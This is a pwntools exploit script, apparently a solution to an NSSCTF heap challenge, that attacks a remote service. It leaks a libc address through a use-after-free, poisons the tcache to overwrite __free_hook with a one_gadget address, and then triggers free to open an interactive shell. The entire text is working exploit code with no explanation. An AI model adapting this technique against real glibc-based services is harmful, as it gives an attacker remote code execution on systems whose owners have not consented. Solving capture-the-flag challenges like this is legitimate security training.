from pwn import *

# io = process("./heap")
io = remote("node4.anna.nssctf.cn", 28025)
libc = ELF("./libc-2.27.so")

context.log_level = "debug"


def select(id: int):
    io.recvuntil(b">>")
    io.sendline(str(id).encode())


def create(idx: int, size: int):
    select(1)
    io.recvuntil(b"idx? ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"size? ")
    io.sendline(str(size).encode())


def delete(idx: int):
    select(2)
    io.recvuntil(b"idx? ")
    io.sendline(str(idx).encode())


def show(idx: int):
    select(3)
    io.recvuntil(b"idx? ")
    io.sendline(str(idx).encode())


def edit(idx: int, content: bytes):
    select(4)
    io.recvuntil(b"idx? ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"content : ")
    io.sendline(content)


create(0, 0x410)
create(1, 0x10)
delete(0)
show(0)
libc_base = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - 0x3EBCA0
print("libc base address =", hex(libc_base))
free_hook = libc_base + libc.sym["__free_hook"]
one_gadget = libc_base + 0x4F302
create(2, 0x20)
delete(2)
edit(2, p64(free_hook))
create(3, 0x20)
create(4, 0x20)
edit(4, p64(one_gadget))

delete(1)

# gdb.attach(io)

io.interactive()
